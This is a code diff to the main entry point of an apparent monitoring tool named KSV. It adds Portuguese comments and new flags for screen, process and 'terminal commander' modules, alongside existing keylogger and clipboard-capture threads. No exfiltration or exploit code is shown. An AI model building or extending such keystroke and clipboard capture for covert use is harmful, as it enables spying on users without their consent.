@@ -10,17 +10,20 @@
 int main(int argc, const char *args[]) {
     Argumentation *argumentation = new Argumentation(argc, args);
 
+    // Mostrar versão do KSV
     if (argumentation->hasArg((char *) "--version") || argumentation->hasArg((char *) "-v")) {
         Presenter::showVersion();
         exit(0);
     }
 
+    // Mostrar menu de ajuda do KSV
     if (argumentation->hasArg((char *) "--help") || argumentation->hasArg((char *) "-h")) {
         Presenter::showHelp();
         exit(0);
     }
 
-    Presenter::showHeader();
+    // Welcome to... K S V!!
+//    Presenter::showHeader();
 
     Logger *logger = Logger::instance();
     bool useSameLogFile = true;
@@ -37,6 +40,7 @@ int main(int argc, const char *args[]) {
 
     std::cout << "[INFO] Log will be saved at \"" << file << "\"" << std::endl;
 
+    // Verifica se o arquivo de log ja existe
     if (std::ifstream(file)) {
         logger->i("Log file already exists");
 
@@ -71,12 +75,16 @@ int main(int argc, const char *args[]) {
     Keylogger keylogger;
     Clipboard clipboard;
 
+    // Registra as threads dos Runners para captura de eventos
     std::thread thread[2];
     thread[0] = std::thread(keylogger);
     thread[1] = std::thread(clipboard);
 
     bool disableKeyboard = argumentation->hasArg((char *) "--disableKeylogger");
     bool disableClipboard = argumentation->hasArg((char *) "--disableClipboard");
+    bool disableScreenlogger = argumentation->hasArg((char *) "--disableScreenlogger");
+    bool disableProcesslogger = argumentation->hasArg((char *) "--disableProcesslogger");
+    bool disableTerminalCommander = argumentation->hasArg((char *) "--disableTerminalCommander");
 
     // Verifica se o clipboard deve ser ativado
     if (!disableClipboard) {
